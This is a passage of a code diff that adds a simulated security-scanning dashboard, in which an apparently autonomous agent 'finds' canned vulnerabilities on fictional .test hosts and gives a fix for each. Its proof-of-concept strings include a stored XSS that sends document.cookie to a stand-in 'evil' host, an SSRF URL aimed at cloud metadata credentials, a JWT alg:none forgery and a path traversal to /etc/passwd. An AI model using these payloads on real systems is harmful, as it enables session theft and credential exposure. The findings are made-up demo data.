+        poc:"curl -sI https://demo-shop.sentinel.test | grep -i strict-transport  →  (none)",
+        fix:"Add HSTS, X-Content-Type-Options: nosniff, Referrer-Policy, and a restrictive CSP at the edge/proxy."},
+      {sev:"low",cvss:3.7,name:"Verbose server banner",cwe:"CWE-200",owasp:"A05",target:"Server header",
+        desc:"The Server header discloses exact framework and version, easing targeted exploit selection.",
+        poc:"Server: nginx/1.18.0 (Ubuntu) express/4.17",
+        fix:"Suppress or genericize version banners at the reverse proxy."}
+    ],
+    "api.acme-internal.test":[
+      {sev:"critical",cvss:9.4,name:"Broken authentication — JWT 'alg:none'",cwe:"CWE-347",owasp:"A07",target:"/auth/verify",
+        desc:"The API accepts unsigned JWTs when the alg header is set to none, letting an attacker forge any identity, including admin.",
+        poc:'header {"alg":"none"} · payload {"sub":"admin","role":"root"}',
+        fix:"Pin the expected algorithm server-side (e.g. RS256), reject alg:none, and verify the signature against a trusted key."},
+      {sev:"high",cvss:8.6,name:"Server-side request forgery (SSRF)",cwe:"CWE-918",owasp:"A10",target:"/fetch?url=",
+        desc:"An import feature fetches arbitrary URLs, reaching the cloud metadata endpoint and returning instance credentials.",
+        poc:"url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        fix:"Allow-list destination hosts, block link-local/private ranges, and require IMDSv2 with hop-limit 1."},
+      {sev:"high",cvss:7.4,name:"Mass assignment escalates role",cwe:"CWE-915",owasp:"A08",target:"PATCH /users/me",
+        desc:"The profile update binds the whole request body to the model, so an attacker can set role=admin.",
+        poc:'{"displayName":"x","role":"admin"}  →  200 OK, role updated',
+        fix:"Bind only an explicit allow-list of editable fields; never mass-assign privileged attributes."},
+      {sev:"medium",cvss:6.5,name:"No rate limiting on login",cwe:"CWE-307",owasp:"A07",target:"/auth/login",
+        desc:"Unlimited authentication attempts permit credential stuffing and brute force.",
+        poc:"5,000 attempts in 60s  →  no throttle, no lockout",
+        fix:"Add per-account and per-IP rate limits, exponential backoff, and CAPTCHA / MFA on suspicious volume."},
+      {sev:"medium",cvss:5.9,name:"Outdated dependency with known CVE",cwe:"CWE-1104",owasp:"A06",target:"package: lodash@4.17.11",
+        desc:"A bundled dependency has a published prototype-pollution advisory with a fix available.",
+        poc:"lodash 4.17.11  <  4.17.21 (CVE fixed)",
+        fix:"Upgrade to the patched release and add automated dependency scanning (SCA) to CI."},
+      {sev:"low",cvss:3.1,name:"CORS reflects arbitrary origin",cwe:"CWE-942",owasp:"A05",target:"Access-Control-Allow-Origin",
+        desc:"The API reflects any Origin with credentials allowed, weakening cross-origin protections.",
+        poc:"Origin: https://evil.test  →  ACAO: https://evil.test",
+        fix:"Reflect only an allow-list of trusted origins; do not combine wildcard reflection with credentials."}
+    ],
+    "vault.acme-internal.test":[
+      {sev:"critical",cvss:9.9,name:"Hard-coded secret in exposed .env",cwe:"CWE-798",owasp:"A05",target:"/.env",
+        desc:"A deployment left the environment file web-readable, leaking the root API token and DB password.",
+        poc:"GET /.env  →  VAULT_ROOT_TOKEN=s.7f… DB_PASS=…",
+        fix:"Block dotfiles at the web server, rotate every exposed secret immediately, and move secrets to a managed vault with short-lived tokens."},
+      {sev:"critical",cvss:9.1,name:"Default admin credentials active",cwe:"CWE-1392",owasp:"A07",target:"/login",
+        desc:"The admin console still accepts the shipped default credentials.",
+        poc:"admin : admin  →  full console access",
+        fix:"Force a credential change on first boot, disable defaults, and require MFA for admin roles."},
+      {sev:"high",cvss:8.2,name:"Path traversal in file download",cwe:"CWE-22",owasp:"A01",target:"/download?f=",
+        desc:"The download handler does not canonicalize paths, permitting reads outside the intended directory.",
+        poc:"f=../../../../etc/passwd  →  200 OK (file contents)",
+        fix:"Resolve and confine paths to a base directory, reject traversal sequences, and serve by opaque id."},
+      {sev:"medium",cvss:6.8,name:"TLS 1.0/1.1 still enabled",cwe:"CWE-327",owasp:"A02",target:":443",
+        desc:"Deprecated TLS versions and weak ciphers remain negotiable.",
+        poc:"handshake succeeds with TLS 1.0 / RC4",
+        fix:"Require TLS 1.2+ (prefer 1.3), disable weak ciphers, and enable OCSP stapling."},
+      {sev:"medium",cvss:5.4,name:"Secrets logged in plaintext",cwe:"CWE-532",owasp:"A09",target:"/var/log/app.log",
+        desc:"Authorization headers and tokens are written to application logs.",
+        poc:'log line: "auth=Bearer s.7f3a… request ok"',
+        fix:"Redact secrets before logging, and restrict + monitor log access."},
+      {sev:"low",cvss:3.3,name:"Directory listing enabled",cwe:"CWE-548",owasp:"A05",target:"/backups/",
+        desc:"An open directory index reveals backup archive names and timestamps.",
+        poc:"GET /backups/  →  index of 14 files",
+        fix:"Disable auto-indexing and place backups outside the web root."}
+    ],
+    "portal.northwind.test":[
+      {sev:"high",cvss:8.3,name:"Stored XSS in support tickets",cwe:"CWE-79",owasp:"A03",target:"/tickets/new",
+        desc:"Ticket bodies render unsanitized HTML to staff, letting a customer run script in an agent's session.",
+        poc:'body: <img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">',
+        fix:"Sanitize on output with a vetted library, set HttpOnly + SameSite cookies, and apply a strict CSP."},
+      {sev:"high",cvss:7.7,name:"Session fixation on login",cwe:"CWE-384",owasp:"A07",target:"/login",
+        desc:"The session identifier is not rotated after authentication, enabling fixation attacks.",
+        poc:"pre-set SID persists post-login  →  hijack",
+        fix:"Regenerate the session id on privilege change and set Secure, HttpOnly, SameSite cookie flags."},
+      {sev:"medium",cvss:6.3,name:"Weak password policy",cwe:"CWE-521",owasp:"A07",target:"/register",
+        desc:"Accounts accept 4-character passwords with no breach check, inviting credential stuffing.",
+        poc:'password "1234" accepted',
+        fix:"Enforce length ≥ 12, screen against known-breached lists, and offer passkeys / MFA."},
+      {sev:"medium",cvss:5.8,name:"Open redirect on logout",cwe:"CWE-601",owasp:"A01",target:"/logout?next=",
+        desc:"The next parameter is not validated, enabling convincing phishing redirects.",
+        poc:"next=https://evil.test/login  →  302 to attacker",
+        fix:"Allow only relative paths or an allow-list of hosts for redirect targets."},
+      {sev:"low",cvss:4.0,name:"Autocomplete on sensitive field",cwe:"CWE-200",owasp:"A05",target:"/payment",
+        desc:"The card-number input permits browser autocomplete, risking exposure on shared devices.",
+        poc:'<input name="card"> without autocomplete="off"',
+        fix:"Disable autocomplete on sensitive inputs and avoid retaining card data client-side."},
+      {sev:"low",cvss:3.5,name:"Clickjacking — no frame guard",cwe:"CWE-1021",owasp:"A05",target:"* (all pages)",
+        desc:"Pages can be framed by third parties, enabling UI-redress attacks.",
+        poc:"no X-Frame-Options / frame-ancestors set",
+        fix:"Set Content-Security-Policy frame-ancestors 'self' (or X-Frame-Options: DENY)."}
+    ]
+  };
+
+  /* ---------------- STATE ---------------- */
+  var state = { findings:[], filter:"all", threatsBlocked:0 };
+
+  /* ---------------- AGENT RUN SEQUENCE ---------------- */
+  var term=$("#term"), flowEl=$("#flow"), deployBtn=$("#deploy"), targetSel=$("#target"), agentTag=$("#agent-tag");
+  var PHASES=[{k:"recon",l:"Recon"},{k:"enum",l:"Enumerate"},{k:"scan",l:"Scan"},{k:"exploit",l:"Validate"},{k:"report",l:"Report"}];
+  var running=false;
+
+  function renderFlow(activeIdx, doneTo){
+    flowEl.innerHTML="";
+    PHASES.forEach(function(p,i){
+      var d=document.createElement("div"); d.className="phase";
+      if(i<doneTo) d.classList.add("done"); else if(i===activeIdx) d.classList.add("active");
+      d.innerHTML='<div class="ph-i">0'+(i+1)+'</div>'+p.l;
+      flowEl.appendChild(d);
+    });
+  }
+  renderFlow(-1,0);
+
+  function line(html){
+    var d=document.createElement("div"); d.className="ln"; d.innerHTML=html;
+    term.appendChild(d); term.scrollTop=term.scrollHeight;
+  }
+  function stamp(){ return '<span class="t">['+new Date().toLocaleTimeString('en-GB',{hour12:false})+']</span> '; }
+
+  function wait(ms){ return new Promise(function(r){ setTimeout(r, reduce?Math.min(ms,40):ms); }); }
+
+  async function typeFindingLog(f){
+    var cls=f.sev==="critical"?"crit":(f.sev==="high"?"crit":(f.sev==="medium"?"warn":"info"));
+    line(stamp()+'<span class="agn">◆ agent</span> probing <span class="dim">'+f.target+'</span>');
+    await wait(240);
+    line(stamp()+'  <span class="'+cls+'">▲ '+f.sev.toUpperCase()+'</span> '+f.name+' <span class="dim">('+f.cwe+' · CVSS '+f.cvss.toFixed(1)+')</span>');
+    await wait(180);
+  }
+
+  async function runAgent(){
+    if(running) return;
+    running=true; deployBtn.disabled=true;
+    var target=targetSel.value;
+    var found=(CATALOG[target]||[]).slice();
+    term.innerHTML=""; agentTag.textContent="Running"; agentTag.style.color="var(--violet)";
+
+    // 01 recon
+    renderFlow(0,0);
+    line(stamp()+'<span class="agn">◆ agent</span> initializing autonomous session against <span class="info">'+target+'</span>');
+    await wait(500);
+    line(stamp()+'resolving host · mapping DNS · fingerprinting stack');
+    await wait(600);
+    line(stamp()+'<span class="ok">✓</span> reachable · TLS negotiated · web stack identified');
+    await wait(400);
+
+    // 02 enumerate
+    renderFlow(1,1);
+    line(stamp()+'<span class="agn">◆ agent</span> crawling surface · enumerating endpoints & parameters');
+    await wait(650);
+    line(stamp()+'<span class="ok">✓</span> discovered '+(8+Math.floor(Math.random()*20))+' routes · '+(found.length+3)+' candidate sinks');
+    await wait(450);
+
+    // 03 scan
+    renderFlow(2,2);
+    line(stamp()+'<span class="agn">◆ agent</span> running OWASP test matrix · reasoning over responses');
+    await wait(500);
+
+    // 04 validate + stream findings
+    renderFlow(3,3);
+    // sort criticals first for drama
+    var order={critical:0,high:1,medium:2,low:3};
+    found.sort(function(a,b){return order[a.sev]-order[b.sev]});
+    for(var i=0;i<found.length;i++){
+      await typeFindingLog(found[i]);
+      state.findings=found.slice(0,i+1);
+      renderFindings(); updatePosture(); updateOwasp(); updateKpis();
+    }
+
+    // 05 report
+    renderFlow(4,5);
+    await wait(300);
+    var c=found.filter(function(f){return f.sev==="critical"}).length;
+    var h=found.filter(function(f){return f.sev==="high"}).length;
+    line(stamp()+'<span class="agn">◆ agent</span> run complete · '+found.length+' findings · <span class="crit">'+c+' critical</span>, <span class="crit">'+h+' high</span>');
+    line(stamp()+'<span class="ok">✓</span> remediation guidance attached to every finding — see board below <span class="cursor"></span>');
+    agentTag.textContent="Complete · "+found.length; agentTag.style.color="var(--good)";
+    running=false; deployBtn.disabled=false;
+  }
+  deployBtn.addEventListener("click",runAgent);
+
+  /* ---------------- FINDINGS BOARD ---------------- */
+  var findingsBody=$("#findings"), findEmpty=$("#find-empty"), findCount=$("#find-count");
+  function renderFindings(){
+    var list=state.findings.filter(function(f){return state.filter==="all"||f.sev===state.filter});
+    findingsBody.innerHTML="";
+    findEmpty.style.display = state.findings.length? "none":"block";
+    findCount.textContent = state.findings.length+" finding"+(state.findings.length===1?"":"s");
+    list.forEach(function(f,idx){
+      var tr=document.createElement("tr"); tr.className="f-row"; tr.setAttribute("tabindex","0"); tr.setAttribute("role","button");
+      tr.innerHTML='<td><span class="sev '+f.sev+'">'+f.sev+'</span></td>'+
+        '<td class="f-name">'+f.name+'<span class="cwe">'+f.cwe+' · '+f.owasp+'</span></td>'+
+        '<td class="cvss" style="color:'+cvssColor(f.cvss)+'">'+f.cvss.toFixed(1)+'</td>'+
+        '<td class="f-target">'+f.target+'</td>';
+      var det=document.createElement("tr"); det.className="f-detail";
+      det.innerHTML='<td colspan="4"><div class="f-detail-inner">'+
+        '<div><h4>Impact</h4><p>'+f.desc+'</p><p style="margin-top:10px"><b style="color:var(--ink)">Proof of concept</b></p><code>'+escapeHtml(f.poc)+'</code></div>'+
+        '<div><h4>Remediation</h4><p class="f-fix">'+f.fix+'</p></div></div></td>';
+      function toggle(){ var open=det.classList.toggle("open"); tr.style.background=open?"rgba(var(--cyan-rgb),.05)":""; }
+      tr.addEventListener("click",toggle);
+      tr.addEventListener("keydown",function(e){ if(e.key==="Enter"||e.key===" "){e.preventDefault();toggle();} });
+      findingsBody.appendChild(tr); findingsBody.appendChild(det);
+    });
+  }
+  function cvssColor(v){ return v>=9?"var(--crit)":v>=7?"#ff8a5c":v>=4?"var(--warn)":"var(--info)"; }
+  function escapeHtml(s){ return s.replace(/[&<>"]/g,function(c){return{"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c];}); }
+
+  $("#filters").addEventListener("click",function(e){
+    var b=e.target.closest(".chip"); if(!b) return;
+    state.filter=b.dataset.sev;
+    [].forEach.call(this.querySelectorAll(".chip"),function(c){c.classList.toggle("on",c===b);});
+    renderFindings();
+  });
+
+  /* ---------------- POSTURE ---------------- */
+  var WEIGHT={critical:22,high:12,medium:5,low:1.5};
+  function updatePosture(){
+    var penalty=state.findings.reduce(function(a,f){return a+WEIGHT[f.sev];},0);
+    var score=Math.max(0,Math.round(100-penalty));
+    if(state.findings.length===0) return;
+    var arc=$("#gauge-arc"), num=$("#gauge-num"), grade=$("#gauge-grade");
+    var C=2*Math.PI*52;
+    arc.style.strokeDashoffset = C*(1-score/100);
+    var col = score>=80?"var(--good)":score>=60?"var(--warn)":score>=40?"#ff8a5c":"var(--crit)";
+    arc.style.stroke=col; num.textContent=score; num.style.color=col;
+    var g = score>=90?"A · Hardened":score>=80?"B · Solid":score>=65?"C · Needs work":score>=45?"D · At risk":"F · Critical exposure";
+    grade.textContent=g; grade.style.color=col;
+    $("#kpi-score").textContent=score; $("#kpi-score").style.color=col;
+    $("#kpi-grade").textContent=g.split(" · ")[1]||"";
+    $("#kpi-score").parentElement.className="kpi "+(score>=80?"good":score>=60?"warn":"crit");
+
+    // breakdown
+    var cats=[
+      {l:"Access Control",owasp:["A01"]},{l:"Injection",owasp:["A03"]},
+      {l:"Authentication",owasp:["A07"]},{l:"Misconfiguration",owasp:["A05"]},
+      {l:"Data & Crypto",owasp:["A02","A08","A09","A10","A04","A06"]}
+    ];
+    var bd=$("#breakdown"); bd.innerHTML="";
+    cats.forEach(function(c){
+      var hits=state.findings.filter(function(f){return c.owasp.indexOf(f.owasp)>=0;});
+      var pen=hits.reduce(function(a,f){return a+WEIGHT[f.sev];},0);
+      var s=Math.max(0,Math.round(100-pen*1.6));
+      var col=s>=80?"var(--good)":s>=55?"var(--warn)":"var(--crit)";
+      var el=document.createElement("div"); el.className="brk";
+      el.innerHTML='<div class="brk-top"><span>'+c.l+'</span><span style="color:'+col+'">'+s+'</span></div>'+
+        '<div class="brk-bar"><div class="brk-fill" style="width:'+s+'%;background:'+col+'"></div></div>';
+      bd.appendChild(el);
+    });
+  }
+
+  /* ---------------- OWASP MATRIX ---------------- */
+  var OWASP=[
+    ["A01","Broken Access Control"],["A02","Cryptographic Failures"],["A03","Injection"],
+    ["A04","Insecure Design"],["A05","Security Misconfiguration"],["A06","Vulnerable Components"],
+    ["A07","Auth Failures"],["A08","Integrity Failures"],["A09","Logging Failures"],["A10","SSRF"]
+  ];
+  function updateOwasp(){
+    var el=$("#owasp"); el.innerHTML="";
+    var passCount=0;
+    OWASP.forEach(function(o){
+      var hits=state.findings.filter(function(f){return f.owasp===o[0];});
+      var worst = hits.some(function(f){return f.sev==="critical"||f.sev==="high";})?"fail":(hits.length?"warn":"pass");
+      if(worst==="pass") passCount++;
+      var d=document.createElement("div"); d.className="ow";
+      d.innerHTML='<span class="oc">'+o[0]+'</span><span class="on">'+o[1]+'</span><span class="os '+worst+'" title="'+worst+'"></span>';
+      el.appendChild(d);
+    });
+    $("#owasp-tag").textContent = state.findings.length? (passCount+"/10 clear") : "—";
+  }
+  updateOwasp();
+
+  /* ---------------- KPIs ---------------- */
+  function updateKpis(){
+    var ch=state.findings.filter(function(f){return f.sev==="critical"||f.sev==="high";}).length;
+    $("#kpi-crit").textContent=ch;
+    $("#bar-open").textContent=state.findings.length;
+  }
+
+  /* ---------------- THREAT RADAR ---------------- */
+  var cv=$("#radar"), ctx=cv.getContext("2d"), R=220, cx=R, cy=R, maxR=R-14;
+  var blips=[];
+  function seedBlips(){
+    blips=[];
+    for(var i=0;i<7;i++){
+      blips.push({a:Math.random()*Math.PI*2, r:40+Math.random()*(maxR-50), life:0, sev:Math.random()});
+    }
+  }
+  seedBlips();
+  var sweep=0;
+  function drawRadar(){
+    ctx.clearRect(0,0,cv.width,cv.height);
+    // rings
+    ctx.strokeStyle="rgba(56,240,255,.14)"; ctx.lineWidth=1.2;
+    for(var i=1;i<=3;i++){ ctx.beginPath(); ctx.arc(cx,cy,maxR*i/3,0,Math.PI*2); ctx.stroke(); }
+    // crosshair
+    ctx.beginPath(); ctx.moveTo(cx-maxR,cy); ctx.lineTo(cx+maxR,cy); ctx.moveTo(cx,cy-maxR); ctx.lineTo(cx,cy+maxR); ctx.stroke();
+    // sweep gradient
+    if(!reduce){
+      var grad=ctx.createConicGradient? null:null;
+      ctx.save(); ctx.translate(cx,cy); ctx.rotate(sweep);
+      var g=ctx.createLinearGradient(0,0,maxR,0);
+      g.addColorStop(0,"rgba(56,240,255,.35)"); g.addColorStop(1,"rgba(56,240,255,0)");
+      ctx.fillStyle=g; ctx.beginPath(); ctx.moveTo(0,0); ctx.arc(0,0,maxR,-0.5,0); ctx.closePath(); ctx.fill();
+      ctx.restore();
+    }
+    // blips
+    blips.forEach(function(b){
+      var x=cx+Math.cos(b.a)*b.r, y=cy+Math.sin(b.a)*b.r;
+      var col=b.sev>0.8?"255,77,106":b.sev>0.55?"255,179,71":"62,240,163";
+      var pulse=0.5+0.5*Math.sin(b.life*4);
+      ctx.beginPath(); ctx.arc(x,y,3.2,0,Math.PI*2); ctx.fillStyle="rgba("+col+",1)"; ctx.fill();
+      ctx.beginPath(); ctx.arc(x,y,3.2+pulse*7,0,Math.PI*2); ctx.strokeStyle="rgba("+col+","+(0.5*(1-pulse))+")"; ctx.lineWidth=1.4; ctx.stroke();
+    });
+    // center
+    ctx.beginPath(); ctx.arc(cx,cy,3,0,Math.PI*2); ctx.fillStyle="rgba(56,240,255,.9)"; ctx.fill();
+  }
+  function tickRadar(){
+    sweep+=0.02; blips.forEach(function(b){b.life+=0.03;});
+    drawRadar();
+    if(!reduce) requestAnimationFrame(tickRadar);
+  }
+  if(reduce) drawRadar(); else tickRadar();
+
+  /* threat feed */
+  var FEED=$("#feed"), barThreats=$("#bar-threats");
+  var SRC=["203.0.113.44","198.51.100.9","45.83.220.11","192.0.2.77","103.21.244.0","185.220.101.7","91.219.237.244","209.141.44.3"];
+  var KIND=[
+    {t:"Port scan detected",x:"blocked",p:0.5},{t:"SSH brute-force burst",x:"blocked",p:0.5},
+    {t:"SQLi probe on /search",x:"flagged",p:0.2},{t:"Malformed JWT rejected",x:"blocked",p:0.5},
+    {t:"Credential stuffing wave",x:"flagged",p:0.15},{t:"Known-bad IP · TOR exit",x:"flagged",p:0.15},
+    {t:"Exploit attempt · CVE-2024",x:"critical",p:0.08},{t:"Rate limit tripped",x:"blocked",p:0.5},
+    {t:"WAF rule 942100 match",x:"blocked",p:0.5},{t:"Anomalous data egress",x:"critical",p:0.06}
+  ];
+  function pushFeed(){
+    var k=KIND[Math.floor(Math.random()*KIND.length)];
+    var el=document.createElement("div"); el.className="fe";
+    var tm=new Date().toLocaleTimeString('en-GB',{hour12:false});
+    el.innerHTML='<span class="fx '+k.x+'">'+k.x+'</span><span class="src">'+k.t+' · '+SRC[Math.floor(Math.random()*SRC.length)]+'</span><span class="tm">'+tm+'</span>';
+    FEED.insertBefore(el,FEED.firstChild);
+    while(FEED.children.length>7) FEED.removeChild(FEED.lastChild);
+    if(k.x==="blocked"){ state.threatsBlocked+=1+Math.floor(Math.random()*4); barThreats.textContent=state.threatsBlocked.toLocaleString(); }
+  }
+  // seed a few then interval
+  for(var s=0;s<4;s++) pushFeed();
+  setInterval(pushFeed, reduce?4000:2100);
+
+  /* ---------------- CLOCK ---------------- */
+  function tickClock(){
+    var d=new Date();
+    $("#bar-clock").textContent=d.toLocaleTimeString('en-GB',{hour12:false,timeZone:'UTC'});
+    $("#foot-time").textContent="Session "+d.toISOString().slice(0,19).replace('T',' ')+"Z";
+  }
+  tickClock(); setInterval(tickClock,1000);
+
+  /* ---------------- CREDENTIAL LAB ---------------- */
+  var pw=$("#pw"), meter=$("#pw-meter"), lbl=$("#pw-label"), crack=$("#pw-crack");
+  var COMMON=["password","123456","qwerty","letmein","admin","welcome","iloveyou","monkey","dragon","111111","abc123","password1","123456789","football","master","sunshine","princess","login","000000","passw0rd"];
+  function analyze(v){
+    var checks=[];
+    var poolLower=/[a-z]/.test(v)?26:0, poolUpper=/[A-Z]/.test(v)?26:0, poolNum=/[0-9]/.test(v)?10:0, poolSym=/[^A-Za-z0-9]/.test(v)?33:0;
+    var pool=poolLower+poolUpper+poolNum+poolSym;
+    var charsets=(poolLower?1:0)+(poolUpper?1:0)+(poolNum?1:0)+(poolSym?1:0);
+    var entropy = v.length? Math.round(v.length*Math.log2(pool||1)) : 0;
+    var isCommon = COMMON.indexOf(v.toLowerCase())>=0;
+    var seqPenalty=/(.)\1{2,}/.test(v)||/(?:012|123|234|345|456|567|678|789|abc|qwe)/i.test(v);
+    if(isCommon) entropy=Math.min(entropy,10);
+    $("#pw-entropy").innerHTML=entropy+'<span style="font-size:11px"> bits</span>';
+    $("#pw-len").textContent=v.length;
+    $("#pw-charset").textContent=charsets;
+
+    checks.push({ok:v.length>=12,t:"At least 12 characters"});
+    checks.push({ok:charsets>=3,t:"Mixes 3+ character types"});
+    checks.push({ok:!isCommon,t:"Not a top-breached password"});
+    checks.push({ok:!seqPenalty,t:"No repeats or keyboard runs"});
+    checks.push({ok:entropy>=60,t:"60+ bits of entropy"});
+    var cel=$("#pw-checks"); cel.innerHTML="";
+    checks.forEach(function(c){
+      var d=document.createElement("div"); d.className="cc "+(c.ok?"pass":"fail");
+      d.innerHTML='<span class="mk">'+(c.ok?"✓":"✕")+'</span>'+c.t; cel.appendChild(d);
+    });
+
+    // strength
+    var score=Math.min(100, Math.round((entropy/90)*100));
+    if(isCommon) score=Math.min(score,8);
+    var col,txt;
+    if(!v.length){col="var(--ink-3)";txt="Awaiting input";score=0;}
+    else if(score<25){col="var(--crit)";txt="Very weak";}
+    else if(score<50){col="#ff8a5c";txt="Weak";}
+    else if(score<72){col="var(--warn)";txt="Fair";}
+    else if(score<88){col="var(--good)";txt="Strong";}
+    else {col="var(--good)";txt="Excellent";}
+    meter.style.width=score+"%"; meter.style.background=col;
+    lbl.textContent=txt; lbl.style.color=col;
+
+    // crack time @ 1e11/s
+    if(v.length){
+      var guesses=Math.pow(2,entropy)/2, secs=guesses/1e11;
+      crack.textContent="≈ "+humanTime(secs)+" to crack";
+    } else crack.textContent="";
+  }
+  function humanTime(s){
+    if(s<1) return "instant";
+    var u=[["century",3155760000],["year",31557600],["day",86400],["hour",3600],["minute",60],["second",1]];
+    for(var i=0;i<u.length;i++){ if(s>=u[i][1]){ var n=s/u[i][1]; if(n>=1e6) return n.toExponential(1)+" "+u[i][0]+"s"; n=Math.round(n); return n+" "+u[i][0]+(n===1?"":"s"); } }
+    return "instant";
+  }
+  pw.addEventListener("input",function(){analyze(pw.value);});
+  $("#pw-toggle").addEventListener("click",function(){
+    var t=pw.type==="password"?"text":"password"; pw.type=t; this.textContent=t==="password"?"Show":"Hide";
+  });
+  analyze("");
+
+})();
+</script>
+</body>
+</html>
